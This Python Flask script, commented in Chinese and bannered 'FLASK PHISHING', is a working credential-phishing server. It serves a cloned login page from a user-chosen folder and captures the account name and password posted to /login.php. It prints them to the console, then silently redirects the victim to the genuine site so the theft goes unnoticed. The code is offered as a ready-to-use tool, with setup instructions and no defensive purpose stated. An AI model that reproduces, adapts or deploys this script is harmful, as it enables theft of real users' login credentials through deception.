#作者技术很差
#闲时写着玩的
#若发现有bug ,请自行修改,也可以给我反馈
#适用于windows,其它系统不保证能正常使用
#使用的第三方库有:flask. 请在使用前安装
#安装flask库的命令:"pip install flask"
from flask import Flask, request, jsonify, render_template, send_from_directory
#import requests
import os
from urllib.parse import parse_qs

#requests.packages.urllib3.disable_warnings()#解除ssl报错

def out(path):#随意编的函数
    if path in ['/', '/login.html']:
        return False
    return True

def display_banner():
    print("███████╗██╗      █████╗ ███████╗██╗  ██╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ ")
    print("██╔════╝██║     ██╔══██╗██╔════╝██║ ██╔╝    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ ")
    print("█████╗  ██║     ███████║███████╗█████╔╝     ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗")
    print("██╔══╝  ██║     ██╔══██║╚════██║██╔═██╗     ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║")
    print("██║     ███████╗██║  ██║███████║██║  ██╗    ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝")
    print("╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ")
    print("                                                                                                     ")
display_banner()#注释掉此行,可取消字符画

web=input("输入网站文件夹:")
weblink=input("输入跳转真链接:")
if (weblink.startswith('http'))!=True:
    weblink='https://' + weblink
if (weblink.endswith('/')):
    weblink=weblink[:-1]

app = Flask(__name__, template_folder=web)

@app.before_request
def specific():
    if (out(request.path)):
        if(os.path.isfile(web+request.path.replace("/", "\\"))):#请求本地文件夹内的资源文件
            print("本地请求:"+request.path)
            return send_from_directory(web,request.path.replace("/", ""))
        # else:#请求站外资源(有风险,可省略)
        #     print(weblink.replace("https://", "http://")+request.path)
        #     rc=requests.get(weblink.replace("https://", "http://")+request.path, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) Chrome/50.0.2661.88'},verify=False,proxies = {'http': None,'https': None})
        #     return rc.text

@app.route('/')
def html():
    return render_template('login.html')

@app.route('/login.php', methods=['POST'])
def login():
    os.system("cls")
    try:#解析功能未完善...懒得写了......
        word = parse_qs(request.get_data())
        loginid=word[b'login'][0].decode('utf-8')
        passwd=word[b'password'][0].decode('utf-8')
        print("账号:"+loginid)
        print("密码:"+passwd)
    except:
        print("账密解析错误:")
        print(request.get_data())
    return ('''<script>window.location.replace("'''+weblink+'''");</script>''')

app.run("0.0.0.0",8080)
#"0.0.0.0"  所有ipv4地址
#"::"       所有ipv6地址
